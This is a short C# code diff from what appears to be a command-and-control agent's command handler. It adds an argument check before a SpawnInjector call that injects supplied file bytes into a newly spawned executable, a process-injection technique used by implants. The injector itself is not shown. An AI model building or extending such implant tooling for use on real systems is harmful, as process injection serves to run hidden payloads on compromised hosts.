@@ -13,6 +13,10 @@ namespace Agent.Commands
 
         public override string Execute(AgentTask task)
         {
+            if (task.Args is null || task.Args.Length == 0)
+            {
+                return "Error Provide Args <fullPathToExe>";
+            }
             var exe = task.Args[0];
             var injector = new SpawnInjector();
             var success = injector.Inject(task.FileBytes,exeToRun:exe);
